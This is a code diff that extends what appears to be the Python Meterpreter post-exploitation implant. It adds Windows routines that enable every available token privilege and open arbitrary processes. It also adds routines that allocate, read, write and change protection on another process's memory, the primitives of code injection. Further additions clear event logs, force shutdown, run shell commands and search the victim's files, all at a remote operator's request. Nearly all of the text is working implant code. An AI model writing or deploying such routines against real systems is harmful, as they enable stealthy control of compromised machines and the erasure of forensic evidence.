+    CloseHandle.argtypes = [ctypes.c_void_p]
+    CloseHandle.restype = ctypes.c_long
+
+    token = ctypes.c_void_p()
+    success = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, token)
+    if not success:
+        return error_result_windows(), response
+
+    priv_list = [
+        "SeAssignPrimaryTokenPrivilege",                 # SE_ASSIGNPRIMARYTOKEN_NAME
+        "SeAuditPrivilege",                              # SE_AUDIT_NAME
+        "SeBackupPrivilege",                             # SE_BACKUP_NAME
+        "SeChangeNotifyPrivilege",                       # SE_CHANGE_NOTIFY_NAME
+        "SeCreateGlobalPrivilege",                       # SE_CREATE_GLOBAL_NAME
+        "SeCreatePagefilePrivilege",                     # SE_CREATE_PAGEFILE_NAME
+        "SeCreatePermanentPrivilege",                    # SE_CREATE_PERMANENT_NAME
+        "SeCreateSymbolicLinkPrivilege",                 # SE_CREATE_SYMBOLIC_LINK_NAME
+        "SeCreateTokenPrivilege",                        # SE_CREATE_TOKEN_NAME
+        "SeDebugPrivilege",                              # SE_DEBUG_NAME
+        "SeDelegateSessionUserImpersonatePrivilege",     # SE_DELEGATE_SESSION_USER_IMPERSONATE_NAME
+        "SeEnableDelegationPrivilege",                   # SE_ENABLE_DELEGATION_NAME
+        "SeImpersonatePrivilege",                        # SE_IMPERSONATE_NAME
+        "SeIncreaseBasePriorityPrivilege",               # SE_INC_BASE_PRIORITY_NAME
+        "SeIncreaseQuotaPrivilege",                      # SE_INCREASE_QUOTA_NAME
+        "SeIncreaseWorkingSetPrivilege",                 # SE_INC_WORKING_SET_NAME
+        "SeLoadDriverPrivilege",                         # SE_LOAD_DRIVER_NAME
+        "SeLockMemoryPrivilege",                         # SE_LOCK_MEMORY_NAME
+        "SeMachineAccountPrivilege",                     # SE_MACHINE_ACCOUNT_NAME
+        "SeManageVolumePrivilege",                       # SE_MANAGE_VOLUME_NAME
+        "SeProfileSingleProcessPrivilege",               # SE_PROF_SINGLE_PROCESS_NAME
+        "SeRelabelPrivilege",                            # SE_RELABEL_NAME
+        "SeRemoteShutdownPrivilege",                     # SE_REMOTE_SHUTDOWN_NAME
+        "SeRestorePrivilege",                            # SE_RESTORE_NAME
+        "SeSecurityPrivilege",                           # SE_SECURITY_NAME
+        "SeShutdownPrivilege",                           # SE_SHUTDOWN_NAME
+        "SeSyncAgentPrivilege",                          # SE_SYNC_AGENT_NAME
+        "SeSystemEnvironmentPrivilege",                  # SE_SYSTEM_ENVIRONMENT_NAME
+        "SeSystemProfilePrivilege",                      # SE_SYSTEM_PROFILE_NAME
+        "SeSystemtimePrivilege",                         # SE_SYSTEMTIME_NAME
+        "SeTakeOwnershipPrivilege",                      # SE_TAKE_OWNERSHIP_NAME
+        "SeTcbPrivilege",                                # SE_TCB_NAME
+        "SeTimeZonePrivilege",                           # SE_TIME_ZONE_NAME
+        "SeTrustedCredManAccessPrivilege",               # SE_TRUSTED_CREDMAN_ACCESS_NAME
+        "SeUndockPrivilege",                             # SE_UNDOCK_NAME
+        "SeUnsolicitedInputPrivilege"                    # SE_UNSOLICITED_INPUT_NAME
+    ]
+    for privilege in priv_list:
+        luid = LUID()
+        name = ctypes.create_unicode_buffer(privilege)
+        success = LookupPrivilegeValue(None, name, luid)
+        if success:
+            size = ctypes.sizeof(TOKEN_PRIVILEGES)
+            size += ctypes.sizeof(LUID_AND_ATTRIBUTES)
+            buffer = ctypes.create_string_buffer(size)
+            tokenPrivileges = ctypes.cast(buffer, PTOKEN_PRIVILEGES).contents
+            tokenPrivileges.PrivilegeCount = 1
+            tokenPrivileges.get_array()[0].Luid = luid
+            tokenPrivileges.get_array()[0].Attributes = SE_PRIVILEGE_ENABLED
+            if AdjustTokenPrivileges(token, False, tokenPrivileges, 0, None, None):
+                response += tlv_pack(TLV_TYPE_PRIVILEGE, privilege)
+    CloseHandle(token)
     return ERROR_SUCCESS, response
 
 @register_function
@@ -1004,14 +1375,35 @@ def stdapi_sys_config_sysinfo(request, response):
     response += tlv_pack(TLV_TYPE_ARCHITECTURE, get_system_arch())
     return ERROR_SUCCESS, response
 
+@register_function_if(has_windll)
+def stdapi_sys_process_attach(request, response):
+    pid = packet_get_tlv(request, TLV_TYPE_PID)['value']
+    if not pid:
+        GetCurrentProcess = ctypes.windll.kernel32.GetCurrentProcess
+        GetCurrentProcess.restype = ctypes.c_void_p
+        handle = GetCurrentProcess()
+    else:
+        inherit = packet_get_tlv(request, TLV_TYPE_INHERIT)['value']
+        permissions = packet_get_tlv(request, TLV_TYPE_PROCESS_PERMS)['value']
+
+        OpenProcess = ctypes.windll.kernel32.OpenProcess
+        OpenProcess.argtypes = [ctypes.c_uint32, ctypes.c_bool, ctypes.c_uint32]
+        OpenProcess.restype = ctypes.c_void_p
+        handle = OpenProcess(permissions, inherit, pid)
+    if not handle:
+        return error_result_windows(), response
+    meterpreter.processes[handle] = None
+    debug_print('[*] added process id: ' + str(pid) + ', handle: ' + str(handle))
+    response += tlv_pack(TLV_TYPE_HANDLE, handle)
+    return ERROR_SUCCESS, response
+
 @register_function
 def stdapi_sys_process_close(request, response):
-    proc_h_id = packet_get_tlv(request, TLV_TYPE_HANDLE)
+    proc_h_id = packet_get_tlv(request, TLV_TYPE_HANDLE)['value']
     if not proc_h_id:
         return ERROR_SUCCESS, response
-    proc_h_id = proc_h_id['value']
-    if proc_h_id in meterpreter.processes:
-        del meterpreter.processes[proc_h_id]
+    if not meterpreter.close_process(proc_h_id):
+        return ERROR_FAILURE, response
     return ERROR_SUCCESS, response
 
 @register_function
@@ -1025,37 +1417,101 @@ def stdapi_sys_process_execute(request, response):
     flags = packet_get_tlv(request, TLV_TYPE_PROCESS_FLAGS)['value']
     if len(cmd) == 0:
         return ERROR_FAILURE, response
-    if os.path.isfile('/bin/sh'):
-        args = ['/bin/sh', '-c', cmd + ' ' + raw_args]
+    if os.path.isfile('/bin/sh') and (flags & PROCESS_EXECUTE_FLAG_SUBSHELL):
+        if raw_args:
+            cmd = cmd + ' ' + raw_args
+        args = ['/bin/sh', '-c', cmd]
     else:
         args = [cmd]
         args.extend(shlex.split(raw_args))
+
     if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED):
-        if has_pty:
+        if has_pty and (flags & PROCESS_EXECUTE_FLAG_PTY):
             master, slave = pty.openpty()
             if has_termios:
                 try:
                     settings = termios.tcgetattr(master)
-                    settings[3] = settings[3] & ~termios.ECHO
                     termios.tcsetattr(master, termios.TCSADRAIN, settings)
                 except:
                     pass
-            proc_h = STDProcess(args, stdin=slave, stdout=slave, stderr=slave, bufsize=0)
+            proc_h = STDProcess(args, stdin=slave, stdout=slave, stderr=slave, bufsize=0, preexec_fn=os.setsid)
             proc_h.stdin = os.fdopen(master, 'wb')
             proc_h.stdout = os.fdopen(master, 'rb')
             proc_h.stderr = open(os.devnull, 'rb')
+            proc_h.ptyfd = slave
         else:
             proc_h = STDProcess(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             proc_h.echo_protection = True
         proc_h.start()
     else:
         proc_h = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
     proc_h_id = meterpreter.add_process(proc_h)
     response += tlv_pack(TLV_TYPE_PID, proc_h.pid)
     response += tlv_pack(TLV_TYPE_PROCESS_HANDLE, proc_h_id)
     if (flags & PROCESS_EXECUTE_FLAG_CHANNELIZED):
         channel_id = meterpreter.add_channel(MeterpreterProcess(proc_h))
         response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
+    return ERROR_SUCCESS, response
+
+@register_function_if(has_windll)
+def stdapi_sys_process_get_info(request, response):
+    proc_h = packet_get_tlv(request, TLV_TYPE_HANDLE).get('value')
+    if not proc_h:
+        return ERROR_INVALID_PARAMETER, response
+
+    MAX_PATH = 260
+
+    EnumProcessModules = ctypes.windll.Psapi.EnumProcessModules
+    EnumProcessModules.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
+    EnumProcessModules.restype = ctypes.c_long
+
+    GetModuleFileNameExW = ctypes.windll.Psapi.GetModuleFileNameExW
+    GetModuleFileNameExW.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong]
+    GetModuleFileNameExW.restype = ctypes.c_ulong
+
+    GetModuleBaseNameW = ctypes.windll.Psapi.GetModuleBaseNameW
+    GetModuleBaseNameW.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong]
+    GetModuleBaseNameW.restype = ctypes.c_ulong
+
+    def enum_process_modules(hProcess):
+        buf_count = 256
+        while True:
+            buffer = (ctypes.c_void_p * buf_count)()
+            buf_size = ctypes.sizeof(buffer)
+            needed = ctypes.c_ulong()
+            if not EnumProcessModules(hProcess, ctypes.byref(buffer), buf_size, ctypes.byref(needed)):
+                raise OSError('EnumProcessModules')
+            if buf_size < needed.value:
+                buf_count = needed.value // (buf_size // buf_count)
+                continue
+            count = needed.value // (buf_size // buf_count)
+            return map(ctypes.c_void_p, buffer[:count])
+
+    def get_module_name(hProcess, hModule):
+        base_name_buffer = ctypes.create_unicode_buffer(MAX_PATH)
+        if not GetModuleBaseNameW(hProcess, hModule, base_name_buffer, MAX_PATH):
+            raise OSError('GetModuleBaseNameW')
+        return base_name_buffer.value
+
+    def get_module_filename(hProcess, hModule):
+        buffer = ctypes.create_unicode_buffer(MAX_PATH)
+        nSize = ctypes.c_ulong(MAX_PATH)
+        if not GetModuleFileNameExW(hProcess, hModule, ctypes.byref(buffer), nSize):
+            raise OSError('GetModuleFileNameExW')
+        return buffer.value
+
+    try:
+        for hModule in enum_process_modules(proc_h):
+            module_name = get_module_name(proc_h, hModule)
+            module_filename = get_module_filename(proc_h, hModule)
+            response += tlv_pack(TLV_TYPE_PROCESS_NAME, module_name)
+            response += tlv_pack(TLV_TYPE_PROCESS_PATH, module_filename)
+            break
+    except OSError as error:
+        debug_print('[-] method stdapi_sys_process_get_info failed on: ' + str(error))
+        return error_result_windows(), response
+
     return ERROR_SUCCESS, response
 
 @register_function
@@ -1112,12 +1568,11 @@ def stdapi_sys_process_get_processes_via_proc(request, response):
     return ERROR_SUCCESS, response
 
 def stdapi_sys_process_get_processes_via_ps(request, response):
-    ps_args = ['ps', 'ax', '-w', '-o', 'pid,ppid,user,command']
-    proc_h = subprocess.Popen(ps_args, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    ps_output = str(proc_h.stdout.read())
-    ps_output = ps_output.split('\n')
-    ps_output.pop(0)
-    for process in ps_output:
+    ps_output = get_process_output(['ps', 'ax', '-w', '-o', 'pid,ppid,user,command'])
+
+    output = ps_output.split('\n')
+    output.pop(0)
+    for process in output:
         process = process.split()
         if len(process) < 4:
             break
@@ -1132,8 +1587,6 @@ def stdapi_sys_process_get_processes_via_ps(request, response):
 
 def stdapi_sys_process_get_processes_via_windll(request, response):
     TH32CS_SNAPPROCESS = 2
-    TOKEN_QUERY = 0x0008
-    TokenUser = 1
     k32 = ctypes.windll.kernel32
     pe32 = PROCESSENTRY32()
     pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
@@ -1162,9 +1615,9 @@ def stdapi_sys_process_get_processes_via_windll(request, response):
         else:
             exe_path = ''
         process_username = ''
-        process_token_user = get_token_user(proc_h)
-        if process_token_user:
-            process_username = get_username_from_token(process_token_user) or ''
+        process_token_user_sid = get_token_user_sid(proc_h)
+        if process_token_user_sid:
+            process_username = get_username_from_sid(process_token_user_sid) or ''
         parch = windll_GetNativeSystemInfo()
         is_wow64 = ctypes.c_ubyte()
         is_wow64.value = 0
@@ -1193,12 +1646,181 @@ def stdapi_sys_process_get_processes(request, response):
         return stdapi_sys_process_get_processes_via_windll(request, response)
     else:
         return stdapi_sys_process_get_processes_via_ps(request, response)
-    return ERROR_FAILURE, response
+
+@register_function_if(has_windll)
+def stdapi_sys_process_memory_allocate(request, response):
+    handle = packet_get_tlv(request, TLV_TYPE_HANDLE).get('value', 0)
+    base   = packet_get_tlv(request, TLV_TYPE_BASE_ADDRESS).get('value', 0)
+    size   = packet_get_tlv(request, TLV_TYPE_LENGTH).get('value', 0)
+    alloc  = packet_get_tlv(request, TLV_TYPE_ALLOCATION_TYPE).get('value', 0)
+    prot   = packet_get_tlv(request, TLV_TYPE_PROTECTION).get('value', 0)
+
+    VirtualAllocEx = ctypes.windll.kernel32.VirtualAllocEx
+    VirtualAllocEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
+    VirtualAllocEx.restype = ctypes.c_void_p
+
+    result = VirtualAllocEx(handle, base, size, alloc, prot)
+    if not result:
+        return error_result_windows(), response
+
+    response += tlv_pack(TLV_TYPE_BASE_ADDRESS, result)
+    return ERROR_SUCCESS, response
+
+@register_function_if(has_windll)
+def stdapi_sys_process_memory_lock(request, response):
+    base = packet_get_tlv(request, TLV_TYPE_BASE_ADDRESS).get('value', 0)
+    size = packet_get_tlv(request, TLV_TYPE_LENGTH).get('value', 0)
+
+    VirtualLock = ctypes.windll.kernel32.VirtualLock
+    VirtualLock.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
+    VirtualLock.restype = ctypes.c_long
+
+    if not VirtualLock(base, size):
+        return error_result_windows(), response
+    return ERROR_SUCCESS, response
+
+@register_function_if(has_windll)
+def stdapi_sys_process_memory_unlock(request, response):
+    base = packet_get_tlv(request, TLV_TYPE_BASE_ADDRESS).get('value', 0)
+    size = packet_get_tlv(request, TLV_TYPE_LENGTH).get('value', 0)
+
+    VirtualUnlock = ctypes.windll.kernel32.VirtualUnlock
+    VirtualUnlock.argtypes = [ctypes.c_void_p, ctypes.c_size_t]
+    VirtualUnlock.restype = ctypes.c_long
+
+    if not VirtualUnlock(base, size):
+        return error_result_windows(), response
+    return ERROR_SUCCESS, response
+
+@register_function_if(has_windll)
+def stdapi_sys_process_memory_read(request, response):
+    ERROR_PARTIAL_COPY = 229
+    handle = packet_get_tlv(request, TLV_TYPE_HANDLE).get('value')
+    base = packet_get_tlv(request, TLV_TYPE_BASE_ADDRESS).get('value')
+    size = packet_get_tlv(request, TLV_TYPE_LENGTH).get('value')
+
+    if not (handle and base and size):
+        return ERROR_INVALID_PARAMETER, response
+
+    ReadProcessMemory = ctypes.windll.kernel32.ReadProcessMemory
+    ReadProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
+    ReadProcessMemory.restype = ctypes.c_bool
+
+    buffer = ctypes.create_string_buffer(size)
+    bytes_read = ctypes.c_size_t(0)
+    if (not ReadProcessMemory(handle, base, ctypes.byref(buffer), ctypes.sizeof(buffer), ctypes.byref(bytes_read))) and (ctypes.windll.kernel32.GetLastError() != ERROR_PARTIAL_COPY):
+        return error_result_windows(), response
+
+    readed_data = buffer.raw[:bytes_read.value]
+    response += tlv_pack(TLV_TYPE_PROCESS_MEMORY, readed_data)
+    return ERROR_SUCCESS, response
+
+@register_function_if(has_windll)
+def stdapi_sys_process_memory_write(request, response):
+    ERROR_PARTIAL_COPY = 229
+    handle = packet_get_tlv(request, TLV_TYPE_HANDLE).get('value')
+    base = packet_get_tlv(request, TLV_TYPE_BASE_ADDRESS).get('value')
+    data = packet_get_tlv(request, TLV_TYPE_PROCESS_MEMORY).get('value')
+
+    if not (handle and base and data):
+        return ERROR_INVALID_PARAMETER, response
+
+    WriteProcessMemory = ctypes.windll.kernel32.WriteProcessMemory
+    WriteProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
+    WriteProcessMemory.restype = ctypes.c_bool
+
+    written = ctypes.c_size_t(0)
+    if (not WriteProcessMemory(handle, base, data, len(data), ctypes.byref(written))) and (ctypes.windll.kernel32.GetLastError() != ERROR_PARTIAL_COPY):
+        return error_result_windows(), response
+
+    response += tlv_pack(TLV_TYPE_LENGTH, written.value)
+    return ERROR_SUCCESS, response
+
+@register_function_if(has_windll)
+def stdapi_sys_process_memory_protect(request, response):
+    handle = packet_get_tlv(request, TLV_TYPE_HANDLE).get('value')
+    base   = packet_get_tlv(request, TLV_TYPE_BASE_ADDRESS).get('value')
+    size   = packet_get_tlv(request, TLV_TYPE_LENGTH).get('value')
+    prot   = packet_get_tlv(request, TLV_TYPE_PROTECTION).get('value')
+
+    if not (handle and base and size):
+        return ERROR_INVALID_PARAMETER, response
+
+    VirtualProtectEx = ctypes.windll.kernel32.VirtualProtectEx
+    VirtualProtectEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_void_p]
+    VirtualProtectEx.restype = ctypes.c_long
+
+    old_prot = ctypes.c_ulong()
+    if not VirtualProtectEx(handle, base, size, prot, ctypes.byref(old_prot)):
+        return error_result_windows(), response
+    response += tlv_pack(TLV_TYPE_PROTECTION, old_prot.value)
+    return ERROR_SUCCESS, response
+
+@register_function_if(has_windll)
+def stdapi_sys_process_memory_query(request, response):
+    handle = packet_get_tlv(request, TLV_TYPE_HANDLE).get('value')
+    base = packet_get_tlv(request, TLV_TYPE_BASE_ADDRESS).get('value')
+
+    if not handle:
+        return ERROR_INVALID_PARAMETER, response
+
+    VirtualQueryEx = ctypes.windll.kernel32.VirtualQueryEx
+    VirtualQueryEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(MEMORY_BASIC_INFORMATION), ctypes.c_size_t]
+    VirtualQueryEx.restype = ctypes.c_size_t
+
+    info = MEMORY_BASIC_INFORMATION()
+    size = VirtualQueryEx(handle, base, ctypes.byref(info), ctypes.sizeof(info))
+    if size == 0:
+        return error_result_windows(), response
+
+    response += tlv_pack(TLV_TYPE_BASE_ADDRESS, info.BaseAddress or 0)
+    response += tlv_pack(TLV_TYPE_ALLOC_BASE_ADDRESS, info.AllocationBase or 0)
+    response += tlv_pack(TLV_TYPE_ALLOC_PROTECTION, info.AllocationProtect)
+    response += tlv_pack(TLV_TYPE_LENGTH, info.RegionSize)
+    response += tlv_pack(TLV_TYPE_MEMORY_STATE, info.State)
+    response += tlv_pack(TLV_TYPE_PROTECTION, info.Protect)
+    response += tlv_pack(TLV_TYPE_MEMORY_TYPE, info.Type)
+    return ERROR_SUCCESS, response
+
+@register_function_if(has_windll)
+def stdapi_sys_process_memory_free(request, response):
+    handle = packet_get_tlv(request, TLV_TYPE_HANDLE).get('value', 0)
+    base   = packet_get_tlv(request, TLV_TYPE_BASE_ADDRESS).get('value', 0)
+    size   = packet_get_tlv(request, TLV_TYPE_LENGTH).get('value', 0)
+
+    VirtualFreeEx = ctypes.windll.kernel32.VirtualFreeEx
+    VirtualFreeEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong]
+    VirtualFreeEx.restype = ctypes.c_long
+
+    MEM_RELEASE = 0x00008000
+    if not VirtualFreeEx(handle, base, size, MEM_RELEASE):
+        return error_result_windows(), response
+    return ERROR_SUCCESS, response
+
+@register_function_if(has_windll)
+def stdapi_sys_power_exitwindows(request, response):
+    SE_SHUTDOWN_NAME = "SeShutdownPrivilege"
+
+    flags = packet_get_tlv(request, TLV_TYPE_POWER_FLAGS)['value']
+    reason = packet_get_tlv(request, TLV_TYPE_POWER_REASON)['value']
+
+    if not enable_privilege(SE_SHUTDOWN_NAME):
+        return error_result_windows(), response
+
+    ExitWindowsEx = ctypes.windll.user32.ExitWindowsEx
+    ExitWindowsEx.argtypes = [ctypes.c_uint32, ctypes.c_ulong]
+    ExitWindowsEx.restype = ctypes.c_int8
+    if not ExitWindowsEx(flags, reason):
+        return error_result_windows(), response
+    return ERROR_SUCCESS, response
 
 @register_function_if(has_windll)
 def stdapi_sys_eventlog_open(request, response):
     source_name = packet_get_tlv(request, TLV_TYPE_EVENT_SOURCENAME)['value']
-    handle = ctypes.windll.advapi32.OpenEventLogW(None, source_name)
+    OpenEventLogA = ctypes.windll.advapi32.OpenEventLogA
+    OpenEventLogA.argtypes = [ctypes.c_char_p, ctypes.c_char_p]
+    OpenEventLogA.restype = ctypes.c_void_p
+    handle = OpenEventLogA(None, bytes(source_name, 'UTF-8'))
     if not handle:
         return error_result_windows(), response
     response += tlv_pack(TLV_TYPE_EVENT_HANDLE, handle)
@@ -1209,23 +1831,26 @@ def stdapi_sys_eventlog_read(request, response):
     handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
     flags = packet_get_tlv(request, TLV_TYPE_EVENT_READFLAGS)['value']
     offset = packet_get_tlv(request, TLV_TYPE_EVENT_RECORDOFFSET)['value']
-    adv32 = ctypes.windll.advapi32
-    bytes_read = ctypes.c_ulong(0)
-    bytes_needed = ctypes.c_ulong(0)
-    if adv32.ReadEventLogW(handle, flags, offset, ctypes.byref(bytes_read), 0, ctypes.byref(bytes_read), ctypes.byref(bytes_needed)):
+    bytes_read = ctypes.c_uint32(0)
+    bytes_needed = ctypes.c_uint32(0)
+    ReadEventLogA = ctypes.windll.advapi32.ReadEventLogA
+    ReadEventLogA.argtypes = [ctypes.c_void_p, ctypes.c_uint32, ctypes.c_uint32, ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(ctypes.c_uint32), ctypes.POINTER(ctypes.c_uint32)]
+    ReadEventLogA.restype = ctypes.c_bool
+    if ReadEventLogA(handle, flags, offset, ctypes.byref(bytes_read), 0, ctypes.byref(bytes_read), ctypes.byref(bytes_needed)):
         return error_result_windows(), response
-    buf = ctypes.create_unicode_buffer(bytes_needed.value)
-    if not adv32.ReadEventLogW(handle, flags, offset, buf, bytes_needed, ctypes.byref(bytes_read), ctypes.byref(bytes_needed)):
+    buf = (ctypes.c_uint8 * bytes_needed.value)()
+    if not ReadEventLogA(handle, flags, offset, buf, bytes_needed, ctypes.byref(bytes_read), ctypes.byref(bytes_needed)):
         return error_result_windows(), response
-    record = cstruct_unpack(EVENTLOGRECORD, buf)
+    record = ctstruct_unpack(EVENTLOGRECORD, buf)
     response += tlv_pack(TLV_TYPE_EVENT_RECORDNUMBER, record.RecordNumber)
     response += tlv_pack(TLV_TYPE_EVENT_TIMEGENERATED, record.TimeGenerated)
     response += tlv_pack(TLV_TYPE_EVENT_TIMEWRITTEN, record.TimeWritten)
     response += tlv_pack(TLV_TYPE_EVENT_ID, record.EventID)
     response += tlv_pack(TLV_TYPE_EVENT_TYPE, record.EventType)
     response += tlv_pack(TLV_TYPE_EVENT_CATEGORY, record.EventCategory)
-    response += tlv_pack(TLV_TYPE_EVENT_DATA, buf.raw[record.DataOffset:record.DataOffset + record.DataLength])
-    event_strings = buf.raw[record.StringOffset:].split('\x00', record.NumStrings)
+    response += tlv_pack(TLV_TYPE_EVENT_DATA, ctarray_to_bytes(buf[record.DataOffset:record.DataOffset + record.DataLength]))
+    event_string_buf = (ctypes.c_uint8 * len(buf[record.StringOffset:]))(*buf[record.StringOffset:])
+    event_strings = ctarray_to_bytes(event_string_buf).split(NULL_BYTE, record.NumStrings)[:record.NumStrings]
     for event_string in event_strings:
         response += tlv_pack(TLV_TYPE_EVENT_STRING, event_string)
     return ERROR_SUCCESS, response
@@ -1233,14 +1858,20 @@ def stdapi_sys_eventlog_read(request, response):
 @register_function_if(has_windll)
 def stdapi_sys_eventlog_clear(request, response):
     handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
-    if not ctypes.windll.advapi32.ClearEventLogW(handle, None):
+    ClearEventLogA = ctypes.windll.advapi32.ClearEventLogA
+    ClearEventLogA.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
+    ClearEventLogA.restype = ctypes.c_bool
+    if not ClearEventLogA(handle, None):
         return error_result_windows(), response
     return ERROR_SUCCESS, response
 
 @register_function_if(has_windll)
 def stdapi_sys_eventlog_numrecords(request, response):
     handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
-    total = ctypes.c_ulong(0)
+    total = ctypes.c_uint32(0)
+    GetNumberOfEventLogRecords = ctypes.windll.advapi32.GetNumberOfEventLogRecords
+    GetNumberOfEventLogRecords.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint32)]
+    GetNumberOfEventLogRecords.restype = ctypes.c_bool
     if not ctypes.windll.advapi32.GetNumberOfEventLogRecords(handle, ctypes.byref(total)):
         return error_result_windows(), response
     response += tlv_pack(TLV_TYPE_EVENT_NUMRECORDS, total.value)
@@ -1249,16 +1880,22 @@ def stdapi_sys_eventlog_numrecords(request, response):
 @register_function_if(has_windll)
 def stdapi_sys_eventlog_oldest(request, response):
     handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
-    oldest = ctypes.c_ulong(0)
-    if not ctypes.windll.advapi32.GetOldestEventLogRecordW(handle, ctypes.byref(oldest)):
+    GetOldestEventLogRecord = ctypes.windll.advapi32.GetOldestEventLogRecord
+    GetOldestEventLogRecord.argtypes = [ctypes.c_void_p, ctypes.POINTER(ctypes.c_uint32)]
+    GetOldestEventLogRecord.restype = ctypes.c_bool
+    oldest = ctypes.c_uint32(0)
+    if not GetOldestEventLogRecord(handle, ctypes.byref(oldest)):
         return error_result_windows(), response
-    response += tlv_pack(TLV_TYPE_EVENT_RECORDNUMBER, oldest)
+    response += tlv_pack(TLV_TYPE_EVENT_RECORDNUMBER, oldest.value)
     return ERROR_SUCCESS, response
 
 @register_function_if(has_windll)
 def stdapi_sys_eventlog_close(request, response):
     handle = packet_get_tlv(request, TLV_TYPE_EVENT_HANDLE)['value']
-    if not ctypes.windll.advapi32.CloseEventLogW(handle):
+    CloseEventLog = ctypes.windll.advapi32.CloseEventLog
+    CloseEventLog.argtypes = [ctypes.c_void_p]
+    CloseEventLog.restype = ctypes.c_bool
+    if not CloseEventLog(handle):
         return error_result_windows(), response
     return ERROR_SUCCESS, response
 
@@ -1276,7 +1913,10 @@ def stdapi_fs_delete_dir(request, response):
         del_func = os.unlink
     else:
         del_func = shutil.rmtree
-    del_func(dir_path)
+    try:
+        del_func(dir_path)
+    except OSError:
+        return ERROR_FAILURE, response
     return ERROR_SUCCESS, response
 
 @register_function
@@ -1284,7 +1924,10 @@ def stdapi_fs_delete_file(request, response):
     file_path = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
     if has_windll:
         subprocess.call(unicode("attrib.exe -r ") + file_path)
-    os.unlink(unicode(file_path))
+    try:
+        os.unlink(unicode(file_path))
+    except OSError:
+        return ERROR_FAILURE, response
     return ERROR_SUCCESS, response
 
 @register_function
@@ -1348,7 +1991,11 @@ def stdapi_fs_ls(request, response):
         file_path = os.path.join(path, file_name)
         response += tlv_pack(TLV_TYPE_FILE_NAME, file_name)
         response += tlv_pack(TLV_TYPE_FILE_PATH, file_path)
-        response += tlv_pack(TLV_TYPE_STAT_BUF, get_stat_buffer(file_path))
+        try:
+            st_buf = get_stat_buffer(file_path)
+        except OSError:
+            st_buf = bytes()
+        response += tlv_pack(TLV_TYPE_STAT_BUF, st_buf)
     return ERROR_SUCCESS, response
 
 @register_function
@@ -1380,20 +2027,36 @@ def stdapi_fs_search(request, response):
     search_root = unicode(search_root)
     glob = packet_get_tlv(request, TLV_TYPE_SEARCH_GLOB)['value']
     recurse = packet_get_tlv(request, TLV_TYPE_SEARCH_RECURSE)['value']
+    start_date = packet_get_tlv(request,TLV_TYPE_SEARCH_M_START_DATE)
+    end_date = packet_get_tlv(request,TLV_TYPE_SEARCH_M_END_DATE)
     if recurse:
         for root, dirs, files in os.walk(search_root):
             for f in filter(lambda f: fnmatch.fnmatch(f, glob), files):
+                file_stat = os.stat(os.path.join(root, f))
+                mtime = int(file_stat.st_mtime)
+                if start_date and start_date['value'] > mtime:
+                    continue
+                if end_date and end_date['value'] < mtime:
+                    continue
                 file_tlv  = bytes()
                 file_tlv += tlv_pack(TLV_TYPE_FILE_PATH, root)
                 file_tlv += tlv_pack(TLV_TYPE_FILE_NAME, f)
-                file_tlv += tlv_pack(TLV_TYPE_FILE_SIZE, os.stat(os.path.join(root, f)).st_size)
+                file_tlv += tlv_pack(TLV_TYPE_FILE_SIZE, file_stat.st_size)
+                file_tlv += tlv_pack(TLV_TYPE_SEARCH_MTIME, mtime)
                 response += tlv_pack(TLV_TYPE_SEARCH_RESULTS, file_tlv)
     else:
         for f in filter(lambda f: fnmatch.fnmatch(f, glob), os.listdir(search_root)):
+            file_stat = os.stat(os.path.join(search_root, f))
+            mtime = int(file_stat.st_mtime)
+            if start_date and start_date['value'] > mtime:
+                continue
+            if end_date and end_date['value'] < mtime:
+                continue
             file_tlv  = bytes()
             file_tlv += tlv_pack(TLV_TYPE_FILE_PATH, search_root)
             file_tlv += tlv_pack(TLV_TYPE_FILE_NAME, f)
-            file_tlv += tlv_pack(TLV_TYPE_FILE_SIZE, os.stat(os.path.join(search_root, f)).st_size)
+            file_tlv += tlv_pack(TLV_TYPE_FILE_SIZE, file_stat.st_size)
+            file_tlv += tlv_pack(TLV_TYPE_SEARCH_MTIME, mtime)
             response += tlv_pack(TLV_TYPE_SEARCH_RESULTS, file_tlv)
     return ERROR_SUCCESS, response
 
@@ -1447,7 +2110,7 @@ def stdapi_fs_mount_show(request, response):
             buf = ctypes.create_unicode_buffer(1024)
             bufsize = ctypes.c_ulong(1024)
             if mpr.WNetGetUniversalNameW(drive, UNIVERSAL_NAME_INFO_LEVEL, ctypes.byref(buf), ctypes.byref(bufsize)) == 0:
-                pUniversalNameInfo = cstruct_unpack(UNIVERSAL_NAME_INFO, buf)
+                pUniversalNameInfo = ctstruct_unpack(UNIVERSAL_NAME_INFO, buf)
